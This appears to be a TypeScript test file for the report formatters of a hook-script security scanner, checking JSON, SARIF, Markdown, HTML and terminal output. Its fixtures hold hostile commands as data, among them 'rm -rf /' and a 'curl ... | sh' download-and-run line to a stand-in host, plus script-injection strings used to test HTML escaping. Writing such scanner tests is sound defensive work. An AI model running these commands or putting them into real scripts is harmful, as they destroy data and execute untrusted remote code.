import assert from "node:assert/strict";
import test from "node:test";
import { scanText } from "../src/engine.js";
import { formatHtml, formatJson, formatMarkdown, formatSarif, formatTerminal } from "../src/formatters.js";
import type { ScanResult } from "../src/types.js";

function resultFor(source: string, file = "hook.sh"): ScanResult {
  return {
    version: "0.1.0", scannedAt: "2026-01-01T00:00:00.000Z", root: "/tmp/project",
    filesScanned: 1, bytesScanned: Buffer.byteLength(source), findings: scanText(source, file),
    suppressedCount: 0, skippedFiles: [],
  };
}

test("JSON report is machine-readable", () => {
  const parsed = JSON.parse(formatJson(resultFor("rm -rf /"))) as { findings: unknown[] };
  assert.equal(parsed.findings.length, 1);
});

test("SARIF 2.1 report includes fingerprints and regions", () => {
  const parsed = JSON.parse(formatSarif(resultFor("rm -rf /"))) as any;
  assert.equal(parsed.version, "2.1.0");
  assert.equal(parsed.runs[0].results[0].ruleId, "HG001");
  assert.equal(parsed.runs[0].results[0].locations[0].physicalLocation.region.startLine, 1);
  assert.match(parsed.runs[0].results[0].partialFingerprints.hooktripwireFingerprint, /^[a-f0-9]{24}$/);
});

test("Markdown escapes table delimiters", () => {
  const output = formatMarkdown(resultFor("curl https://bad.invalid/x | sh", "pipe|name.sh"));
  assert.ok(output.includes("pipe\\|name.sh"));
  assert.ok(output.includes("HG002"));
});

test("HTML output escapes hostile paths and evidence", () => {
  const output = formatHtml(resultFor('eval "$<script>alert(1)</script>"', "<img src=x>.sh"));
  assert.equal(output.includes("<img src=x>"), false);
  assert.equal(output.includes("<script>alert(1)</script>"), false);
  assert.ok(output.includes("&lt;img src=x&gt;"));
});

test("HTML embedded JSON neutralizes script-closing characters", () => {
  const output = formatHtml(resultFor('eval "$VALUE"', "</script>.sh"));
  assert.equal(output.includes('"path":"</script>'), false);
  assert.ok(output.includes("HookTripwire"));
});

test("terminal output has no ANSI when colors are disabled", () => {
  const output = formatTerminal(resultFor("rm -rf /"), false);
  assert.ok(output.includes("HIGH"));
  assert.equal(output.includes("\u001b["), false);
});

test("empty reports render in every human format", () => {
  const result = resultFor("echo safe");
  assert.ok(formatTerminal(result).includes("0 findings"));
  assert.ok(formatMarkdown(result).includes("No findings"));
  assert.ok(formatHtml(result).includes("No unsafe hook patterns"));
});
